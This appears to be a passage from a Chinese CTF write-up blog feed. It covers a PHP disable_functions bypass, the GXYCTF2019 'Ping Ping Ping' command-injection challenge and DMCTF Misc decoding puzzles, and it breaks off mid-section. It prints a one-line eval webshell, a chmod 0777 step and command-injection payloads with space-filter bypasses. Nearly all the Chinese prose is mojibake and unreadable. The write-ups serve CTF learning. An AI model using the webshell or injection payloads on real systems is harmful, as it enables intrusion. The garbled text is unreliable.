&lt;p>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œè¿›åå°åœ¨æ ¹ç›®å½•æ‰¾åˆ°äº†flagã€readflagã€‚æ‰“å¼€flagå†…å®¹ä¸ºç©ºï¼Œåˆæ‰“å¼€readflagæ–‡ä»¶æ˜¯ä¸€å †ä¹±ç ï¼Œä½†æ˜¯çœ‹åˆ°äº†æ–‡ä»¶å¤´æ˜¯&lt;code>ELF&lt;/code>æ˜¯linuxçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚é‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å°±æ˜¯æ‰§è¡Œreadflagæ‰èƒ½è·å¾—flagï¼Œä½†æ˜¯åœ¨ç»ˆç«¯æ‰§è¡Œæ—¶å‡ºç°äº†ä¸€äº›é—®é¢˜ï¼šæ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œç»ˆç«¯éƒ½åªä¼šè¿”å›&lt;code>ret=127&lt;/code>ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png" alt="">&lt;/p>
&lt;p>æœç´¢äº†ä¸€æ³¢ï¼ŒåŸæ¥æ˜¯æ˜¯&lt;strong>disable_function&lt;/strong>æçš„é¬¼ï¼Œè¿™ä¸ªè¡¨å¯ä»¥åœ¨phpinfo()ä¸­æŸ¥çœ‹ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png" alt="">&lt;/p>
&lt;p>å› ä¸º&lt;code>system&lt;/code>ã€&lt;code>exec&lt;/code>ã€&lt;code>shell_exec&lt;/code>ç­‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«ç¦æ­¢äº†ï¼Œç›®å‰æˆ‘ç†è§£çš„webshellå°±æ˜¯é€šè¿‡è¿™äº›å‡½æ•°æ‰èƒ½åœ¨ç»ˆç«¯æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥ç»ˆç«¯åŸºæœ¬æ˜¯ä¸ªåºŸçš„ï¼Œæ‰€ä»¥å°±æ˜¯å¯»æ‰¾ç»•è¿‡&lt;strong>disable_function&lt;/strong>çš„æ–¹æ³•ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…¶ä»–æ–¹æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªæ–¹æ³•ï¼š&lt;/p>
&lt;p>&lt;strong>åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOADæ¥ç»•è¿‡&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>phpçš„mailå‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šé»˜è®¤è°ƒç”¨ç³»ç»Ÿç¨‹åº/usr/sbin/sendmailï¼Œå¦‚æœæˆ‘ä»¬èƒ½åŠ«æŒsendmailç¨‹åºï¼Œå†ç”¨mailå‡½æ•°æ¥è§¦å‘å°±èƒ½å®ç°æˆ‘ä»¬çš„ç›®çš„&lt;/p>
&lt;p>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸‹ä¸€ä¸ªæœ‰è¶£çš„ç¯å¢ƒå˜é‡ï¼šâ€œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>æ­£å¥½èšå‰‘çš„æ’ä»¶ä¸­å°±æœ‰ä¸€ä¸ªåä¸ºï¼š&lt;a href="https://github.com/Medicean/as_bypass_php_disable_functions">as_bypass_php_disable_functions&lt;/a>çš„æ’ä»¶ï¼Œå¯ä»¥é€‰æ‹©åœ¨æ’ä»¶å¸‚åœºå®‰è£…æˆ–æ˜¯æ‰‹åŠ¨å®‰è£…ï¼ˆgithubæœ‰æ­¥éª¤ï¼‰ã€‚å®‰è£…ä»¥åå³é”®shellé€‰æ‹©åŠ è½½æ’ä»¶ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png" alt="">&lt;/p>
&lt;p>æ’ä»¶çš„å·¥ä½œåŸç†æ˜¯è‡ªåŠ¨ä¸Šä¼ å‡ ä¸ªç»•è¿‡çš„æ–‡ä»¶ï¼Œç„¶åå†ç”¨èšå‰‘è¿æ¥ä¸Šä¼ çš„æ–‡ä»¶å³å¯å®ç°ç»•è¿‡ï¼Œä½†æ˜¯ä¸€å¼€å§‹çš„&lt;code>/var/www/html&lt;/code>ç›®å½•æ˜¯æ²¡æœ‰ä¸Šä¼ æƒé™çš„ï¼Œæˆ‘å³é”®ä»¥åå‘ç°èƒ½ä¿®æ”¹æƒé™ï¼Œæ”¹æˆ0777ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png" alt="">&lt;/p>
&lt;blockquote>
&lt;p>åœ¨è¿™é‡Œæˆ‘è¿˜é‡åˆ°äº†é—®é¢˜ï¼Œä½¿ç”¨åŸæ¥çš„shellæ‰§è¡Œæ’ä»¶åŠŸèƒ½ä»¥åï¼Œç»ˆç«¯è¿˜æ˜¯æ²¡æœ‰æƒé™ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†è‡ªå·±åˆä¸Šä¼ äº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç”¨è¿™ä¸ªæ–°çš„ä¸€å¥è¯æœ¨é©¬æ‰§è¡Œæ’ä»¶æ‰æˆåŠŸï¼Œå…·ä½“åŸå› æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œå¦‚æœæœ‰å¸ˆå‚…çŸ¥é“åŸå› æ±‚å‘ŠçŸ¥ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬233.phpï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
@eval($_POST[&amp;#39;b&amp;#39;]);
&lt;/code>&lt;/pre>&lt;p>å†ç”¨ä¸€å¥è¯æœ¨é©¬çš„shellæ‰§è¡Œæ’ä»¶ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png" alt="">&lt;/p>
&lt;p>è¿›å…¥shellï¼Œç›®å½•ä¸‹é¢å¤šäº†ä¸€ä¸ªåä¸º**.antproxy.php**çš„æ–‡ä»¶ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png" alt="">&lt;/p>
&lt;p>å†ä½¿ç”¨èšå‰‘è¿æ¥**.antproxy.php**ï¼Œå¯†ç æ˜¯è¿è¡Œæ’ä»¶çš„é‚£ä¸ªshellçš„å¯†ç ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å¼€å¼€å¿ƒå¿ƒçš„å»æ ¹ç›®å½•ä¸‹æ‰§è¡Œreadflagè·å¾—flagè¾£ã€‚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png" alt="">&lt;/p>
&lt;p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p></description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping&lt;/h1>
&lt;p>é¢˜ç›®é“¾æ¥ï¼šhttps://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p>
&lt;p>å’ŒDMCTFåšçš„é‚£é“&lt;strong>pingpingping&lt;/strong>ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨ç®¡é“ç¬¦æ„é€ payloadï¼Œå…ˆä½¿ç”¨ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=127.0.0.1|ls
&lt;/code>&lt;/pre>&lt;p>ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼š&lt;code>flag.php&lt;/code>ã€&lt;code>index.php&lt;/code>ã€‚é¦–å…ˆè¯•å‡ºæ¥äº†ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½¿ç”¨ä»¥ä¸‹ç»•è¿‡ç©ºæ ¼ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>$IFS
${IFS}
$IFS$1 //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ
&amp;lt; 
&amp;lt;&amp;gt; 
{cat,flag.php} //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½
%20 
%09 
&lt;/code>&lt;/pre>&lt;p>åœ¨linuxä¸‹åå•å¼•å·é‡Œé¢çš„æŒ‡ä»¤ä¼šè¢«æ‰§è¡Œ &lt;strong>`ls`&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>ä¼šè¾“å‡ºè¯¥ç›®å½•ä¸‹æ‰€æœ‰å¯ä»¥æ‰“å¼€çš„æ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹&lt;strong>index.php&lt;/strong>çš„éƒ¨åˆ†æºç æœ‰å“ªäº›è¿‡æ»¤ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#a6e22e">ip&lt;/span>&lt;span style="color:#f92672">=|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your symbol!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/ /&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your space!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bash/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your bash!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your flag!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">shell_exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ping -c 4 &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$ip);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">print_r&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€äº›åŸºæœ¬çš„ç¬¦å·ã€ç©ºæ ¼ã€bashã€ä»»ä½•å½¢å¼çš„flagå­—çœ¼éƒ½è¢«è¿‡æ»¤äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ‰¾è®¿é—®&lt;strong>flag.php&lt;/strong>ã€‚åœ¨ç½‘ä¸Šçœ‹äº†å¥½å¤šçš„é¢˜è§£ï¼Œç”¨äº†å¥½å¤šæ–¹æ³•ï¼Œä½†æ˜¯ç½‘é¡µè¾“å‡ºéƒ½ä¸ºç©ºï¼ŒåŸæ¥ä»¥ä¸ºå’Œå…¶ä»–é¢˜ç›®ä¸€æ ·ä½¿ç”¨&lt;strong>readflag&lt;/strong>çš„ELFæ‰§è¡Œæ–‡ä»¶è®¿é—®ï¼Œä½†æ˜¯è¿˜æ²¡æˆåŠŸã€‚å…¶å®æ‰§è¡Œï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>è¿™ä¸ªpayloadçš„æ—¶å€™æ–‡ä»¶éƒ½å·²ç»è¾“å‡ºäº†ï¼Œæˆ‘æœ€ååœ¨ç½‘é¡µæºç æ‰¾åˆ°äº†ï¼ŒåŸæ¥æ˜¯è¢«æ³¨é‡Šäº†&lt;!-- raw HTML omitted -->æˆ‘æ˜¯å‚»é€¼&lt;!-- raw HTML omitted -->ã€‚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png" alt="">&lt;/p></description></item><item><title>DMCTFä¹‹Misc</title><link>/posts/ctf/dmctf%E4%B9%8Bmisc/</link><pubDate>Tue, 01 Dec 2020 11:20:45 +0000</pubDate><guid>/posts/ctf/dmctf%E4%B9%8Bmisc/</guid><description>&lt;h1 id="å‰è¨€">å‰è¨€&lt;/h1>
&lt;p>è¿™æ¬¡æ¯”èµ›æ˜¯ç¬¬ä¸€æ¬¡åšMicsçš„é¢˜awaã€‚&lt;/p>
&lt;h1 id="misc">Misc&lt;/h1>
&lt;h2 id="check_in">Check_in&lt;/h2>
&lt;p>çœŸÂ·æœ‰æ‰‹å°±è¡Œ&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130102716.png" alt="">&lt;/p>
&lt;h2 id="fakezip">fakezip&lt;/h2>
&lt;p>çœ‹åˆ°é¢˜ç›®&lt;strong>fakezip&lt;/strong>ç¿»è¯‘ï¼šå‡çš„å‹ç¼©åŒ…ï¼Œæ‰€ä»¥çŒœåº”è¯¥æ˜¯ä¼ªåŠ å¯†ï¼Œè´´ä¸€ä¸ªåŸç†çš„åšå®¢ï¼š&lt;a href="https://blog.csdn.net/u011377996/article/details/79286958">zipä¼ªåŠ å¯†&lt;/a>ï¼Œä½¿ç”¨010 Editoræ‰“å¼€å‹ç¼©åŒ…ï¼Œ&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130103932.png" alt="">&lt;/p>
&lt;p>æ‰¾åˆ°01ä¿®æ”¹ä¸º00ï¼Œå†è§£å‹å‹ç¼©åŒ…ï¼Œè™½ç„¶æç¤ºäº†å‹ç¼©åŒ…é”™è¯¯ä½†æ˜¯ç›´æ¥æ— è§†ï¼Œè·å¾—ä¸€ä¸ªflag.txt&lt;/p>
&lt;p>æ‰“å¼€ä»¥åå†…å®¹æ˜¯ï¼š&lt;code>â™¬â™©Â¶â™¯â™¬â™­â™¬â™«â™«â™ªâ™¬âˆ®â™¬â™­â€–â™­â™¬â™­â™¬âˆ®â™¬â™­â€–â™­â™¬â™­â™«â™«â™¯=&lt;/code>ï¼ŒéŸ³ç¬¦åŠ å¯†è™½ç„¶æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´ï¼Œä½†æ˜¯ç™¾åº¦è¿˜æ˜¯å¯ä»¥ç®€å•æ‰¾åˆ°ï¼š&lt;a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">æ–‡æœ¬åŠ å¯†ä¸ºéŸ³ä¹ç¬¦å·&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130104321.png" alt="">&lt;/p>
&lt;h2 id="base-family">Base family&lt;/h2>
&lt;p>é¢˜ç›®ç»™å‡ºäº†æ˜¯baseå®¶æ—ï¼Œæ‰€ä»¥baseæ‰€æœ‰ç§ç±»éƒ½è¯•ä¸€éã€‚baseå¸¸è§çš„ç§ç±»æœ‰ï¼š&lt;code>base16&lt;/code>ã€&lt;code>base32&lt;/code>ã€&lt;code>base58&lt;/code>ã€&lt;code>base64&lt;/code>ã€&lt;code>base91&lt;/code>ã€‚è¿˜æœ‰å‡ ç§æ²¡å¬è¿‡çš„baseç§ç±»å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™æ‰¾åˆ°ï¼š&lt;a href="http://ctf.ssleye.com/">CTFåœ¨çº¿å·¥å…·&lt;/a>ã€‚&lt;/p>
&lt;p>&lt;strong>åŸå±‚&lt;/strong>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&amp;#34;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&amp;amp;GP&amp;lt;Rk:o_Jk&amp;lt;J.zp8%H0g7sYSTJ9p.&amp;#34;duRBGj`g0!I+xjm(fh)]IF:&amp;gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=&amp;lt;D
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base91è§£ç &lt;/strong>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base58è§£ç &lt;/strong>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base32è§£ç &lt;/strong>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base64è§£ç &lt;/strong>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d
&lt;/code>&lt;/pre>&lt;p>&lt;strong>hexè§£ç &lt;/strong>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>flag{y0u_alr3ady_kn0w_th3_Basefam1ly}
&lt;/code>&lt;/pre>&lt;h2 id="slienteye">SlientEye&lt;/h2>
&lt;p>æ ¹æ®é¢˜ç›®ç›´æ¥ç™¾åº¦&lt;strong>SlientEye&lt;/strong>ï¼Œä¸‹è½½ä»¥åæ‰“å¼€å›¾ç‰‡&amp;ndash;&amp;gt;decodeï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130105145.png" alt="">&lt;/p>
&lt;p>å‚æ•°å•¥çš„éƒ½æ²¡åŠ¨ï¼Œå¯†ç ä¸ºé»˜è®¤å¯†ç ï¼Œç›´æ¥Decodeï¼Œå¾—åˆ°ä¸€ä¸ªflag.txtï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;amp;#102;&amp;amp;#108;&amp;amp;#97;&amp;amp;#103;&amp;amp;#123;&amp;amp;#110;&amp;amp;#49;&amp;amp;#95;&amp;amp;#98;&amp;amp;#117;&amp;amp;#95;&amp;amp;#106;&amp;amp;#49;&amp;amp;#97;&amp;amp;#110;&amp;amp;#103;&amp;amp;#95;&amp;amp;#119;&amp;amp;#117;&amp;amp;#95;&amp;amp;#100;&amp;amp;#51;&amp;amp;#125;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†å»ç™¾åº¦æœåˆ°ä¸€ç¯‡åšå®¢ï¼š&lt;a href="https://www.cnblogs.com/philipding/p/10153094.html">&amp;amp;#xå¼€å¤´çš„æ˜¯ä»€ä¹ˆç¼–ç ?&lt;/a>ï¼Œ&lt;del>æˆ‘ç‚¹å¼€ä¸€çœ‹ï¼Œå“¦ï¼ŒåŸæ¥æ˜¯&lt;/del>entity codeå®ä½“ç¼–ç ï¼Œ&lt;del>æˆ‘å•ªçš„ä¸€ä¸‹å°±&lt;/del>æŠŠflag.txtæ”¹ä¸ºflag.htmlï¼Œ&lt;del>å¾ˆå¿«å•Šï¼Œç„¶åæ˜¯ä¸€ä¸ªå·¦æ­£è¹¬ã€ä¸€ä¸ªå³é­è…¿ã€ä¸€ä¸ªå·¦åˆºæ‹³&lt;/del>æ‰“å¼€flag.htmlè·å¾—flagï¼š&lt;strong>flag{n1_bu_j1ang_wu_d3}&lt;/strong>&lt;/p>
&lt;h2 id="ç¼–ç ä¹‹ç‹">ç¼–ç ä¹‹ç‹&lt;/h2>
&lt;p>ä¸‹è½½æ–‡ä»¶æ‰“å¼€åä¸€å †ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼Œå‰é¢æåˆ°çš„ï¼š&lt;a href="http://ctf.ssleye.com/">CTFåœ¨çº¿å·¥å…·&lt;/a>å°±æœ‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç ï¼Œä¸‹é¢æ”¾å¯†æ–‡ï¼Œä¸Šé¢æ˜¯è§£ç å†…å®¹ã€‚&lt;/p>
&lt;p>è§£å‡ºæ¥ä»¥åçœ‹åˆ°ç¬¬ä¸€å¥ï¼š&lt;code>å¦‚æ˜¯æˆ‘é—»:&lt;/code>ï¼Œ&amp;ndash;&amp;gt;&lt;a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">ä¸ä½›è®ºç¦…&lt;/a>&lt;/p>
&lt;p>å†è§£ä¹‹åçœ‹ç¬¬ä¸€å¥ï¼š&lt;code>æ–°ä½›æ›°ï¼š&lt;/code>ã€‚&amp;ndash;&amp;gt;&lt;a href="http://hi.pcmoe.net/buddha.html">æ–°ä¸ä½›è®ºç¦…&lt;/a>&lt;/p>
&lt;p>è§£å®Œä»¥åç›´æ¥å‡ºäº†ä¸€å †ç”±ï¼š&lt;code>[ã€]ã€!ã€+ã€(ã€)&lt;/code>ç»„æˆçš„ç¬¦å·ï¼Œè¿˜æ˜¯ç™¾åº¦æ‰¾åˆ°äº†è¿™ç§ç¼–ç å«JSfuckï¼Œå¯ä»¥ç›´æ¥æµè§ˆå™¨æ§åˆ¶å°consoleè¾“å‡ºè·å¾—flag&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130110943.png" alt="">&lt;/p>
&lt;h2 id="jpgsteg">jpgsteg&lt;/h2>
&lt;p>é¢˜ç›®å³æ˜¯ç”¨åˆ°çš„å·¥å…·ï¼Œç™¾åº¦ä¸‹è½½è½¯ä»¶ï¼Œä½¿ç”¨jphide.exeæ‰“å¼€å›¾ç‰‡&lt;code>Tap code.jpg&lt;/code>ï¼Œé€‰æ‹©seekåŠŸèƒ½è§£å¯†ï¼Œå¯†ç ä¸º123456ï¼ˆæˆ‘è’™çš„ï¼‰ï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111311.png" alt="">&lt;/p>
&lt;p>æˆåŠŸè§£å¯†åè·å¾—ä¸€ä¸ªæ–‡æ¡£ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>... ....
.. ...
.. ...
. .
... ..
. .
..... .....
.. ....
... ...
.. ..
&lt;/code>&lt;/pre>&lt;p>è¿™é‡Œæˆ‘æ€ç´¢äº†å¥½ä¹…ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ˜¯æ‘©æ–¯å¯†ç ï¼Œä½†æ˜¯åˆå¯¹ä¸ä¸Šå·ï¼Œæœ€åæ‰¾åˆ°äº†ä¸€ä¸ªåä¸ºæ•²å‡»ç çš„ï¼Œæ­£å¥½ä¸€è¡Œä¸­çš„&lt;code>.&lt;/code>åˆ†æˆä¸¤éƒ¨åˆ†ä»£è¡¨åæ ‡&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111538.png" alt="">&lt;/p>
&lt;p>è§£ç å¾—åˆ°ï¼š&lt;code>ohhamazing&lt;/code> ï¼ŒåŠ ä¸Šæ‹¬å·å°±æ˜¯ï¼š&lt;strong>flag{ohhamazing}&lt;/strong>&lt;/p>
&lt;p>äº‹åå¤šçœ‹äº†ä¸€çœ¼å›¾ç‰‡å‘½åï¼š&lt;code>Tap code.jpg&lt;/code>ã€‚è¿™ç”¨å•¥è§£å¯†ä¸å°±åœ¨è„¸ä¸Šå†™ç€çš„&lt;del>wosabi \0/&lt;/del>ã€‚ã€‚ã€‚&lt;/p>
&lt;h2 id="collision">Collision&lt;/h2>
&lt;p>æ‰“å¼€å‹ç¼©åŒ…å‘ç°éƒ½æ˜¯åŠ å¯†ï¼Œä½†æ˜¯åŸå§‹å¤§å°éƒ½ä¸º4ï¼Œåªæœ‰CRCä¸ä¸€æ ·ï¼š&lt;/p>
